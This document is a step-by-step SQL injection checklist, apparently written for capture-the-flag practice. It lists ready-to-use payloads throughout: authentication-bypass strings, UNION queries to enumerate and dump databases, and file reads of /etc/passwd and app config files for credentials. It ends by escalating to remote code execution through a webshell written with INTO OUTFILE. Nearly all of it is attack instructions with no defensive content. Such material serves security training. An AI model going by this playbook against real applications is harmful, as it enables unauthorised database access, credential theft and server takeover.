# SQL Injection Checklist

**Rule:** Simple → Complex. Don't skip steps. Test EVERY field before concluding the app isn't injectable.

## Step 1 — Map Input Fields
- [ ] List ALL input fields: login, registration (every field), search, URL params, hidden fields
- [ ] Note field names, form action URLs, GET vs POST

## Step 2 — Probe Each Field
- [ ] Inject `'` into each field → watch for `500` or behavior change
- [ ] If unsure → confirm with `' OR SLEEP(5)-- -` (5s delay = injectable)
- [ ] Fast response + no change → parameterized → move to next field
- [ ] **Don't give up on the app — keep testing other fields**

## Step 3 — Auth Bypass (in order, stop when one works)
- [ ] `admin'-- -`
- [ ] `admin')-- -` (if query uses parentheses)
- [ ] `' OR '1'='1` (no comment — uses original closing quote)
- [ ] `' OR 1=1-- -`
- [ ] OR injection in password field: `' OR '1'='1`
- [ ] For invitation/access codes: prefix with valid-format string → `xxxx-1111' OR '1'='1`

## Step 4 — UNION Injection
- [ ] Count columns: `' ORDER BY 1-- -`, increment until error
- [ ] Confirm column count: `' UNION SELECT 1,2,3-- -`
- [ ] Find visible columns: note which numbers appear in output
- [ ] Get current DB: `' UNION SELECT 1,database(),3-- -`
- [ ] List tables: query `INFORMATION_SCHEMA.TABLES WHERE table_schema='dbname'`
- [ ] List columns: query `INFORMATION_SCHEMA.COLUMNS WHERE table_name='tablename'`
- [ ] Dump target data

## Step 5 — File Read
- [ ] Confirm user: `user()`
- [ ] Confirm FILE privilege: query `information_schema.user_privileges`
- [ ] Check `secure_file_priv`: empty = can read/write; NULL = blocked
- [ ] Read `/etc/passwd` to confirm file read works
- [ ] Find web root: read `/etc/nginx/sites-enabled/default` or apache config
- [ ] Read app config files for credentials: `config.php`, `db.php`

## Step 6 — RCE
- [ ] Write webshell to web root via `INTO OUTFILE`
- [ ] Confirm execution: `shell.php?0=id`
- [ ] Find flag: `?0=find / -name "flag_*" 2>/dev/null`
- [ ] Cat flag

## Pitfall Reminders
- [ ] OR on empty table = 0 rows → still fails → switch to UNION approach
- [ ] 500 on OR = second query may re-use input (UPDATE after SELECT) → try no-comment OR pattern
- [ ] Always use Burp Repeater for precise payload delivery — browser URL-encodes everything
